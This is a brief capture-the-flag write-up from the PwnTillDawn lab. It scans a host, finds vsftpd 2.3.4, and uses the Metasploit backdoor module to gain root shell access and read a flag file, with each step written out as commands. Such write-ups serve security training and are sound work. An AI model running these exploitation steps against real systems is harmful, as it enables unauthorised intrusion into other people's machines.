# 🛡️ Vulnerability Analysis – System Hacking Using PwnTillDawn


---

## 📖 Overview

This project demonstrates a complete vulnerability analysis and exploitation process conducted in the PwnTillDawn lab environment.
The objective is to identify vulnerabilities, exploit them, and successfully obtain a flag as proof of compromise.

---

## 🎯 Objectives

* 🔍 Identify active hosts in the network
* 🚪 Discover open ports and services
* ⚠️ Detect vulnerabilities in the system
* 💥 Exploit vulnerabilities using Metasploit
* 👑 Gain root-level access
* 🏁 Capture the flag

---

## 🧰 Tools & Technologies

| Tool         | Purpose                      |
| ------------ | ---------------------------- |
| Kali Linux   | Attacker environment         |
| Nmap         | Network scanning             |
| FTP          | Service enumeration          |
| Searchsploit | Vulnerability identification |
| Metasploit   | Exploitation                 |

---

## 🌐 Target Information

* **IP Address:** `10.150.150.12`
* **Service:** FTP (vsftpd 2.3.4)
* **Vulnerability:** Backdoor Command Execution

---

## ⚙️ Methodology

### 🔎 Reconnaissance

```bash
nmap -sn 10.150.150.0/24
```

---

### 📡 Scanning

```bash
nmap -sC -sV -T4 -Pn 10.150.150.12
```

---

### 📂 Enumeration

```bash
ftp 10.150.150.12
```

---

### 💥 Gaining Access

```bash
searchsploit vsftpd 2.3.4
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.150.150.12
run
```

---

### 👑 Privilege Escalation

```bash
whoami
```

> root

---

### 🏁 Capture the Flag

```bash
ls /root
cat /root/FLAG1.txt
```

---

## 🏆 Result

✔ Root access obtained
✔ System successfully compromised
✔ Flag retrieved

---

## 👩‍💻 Author

**Lyana Yasmin**
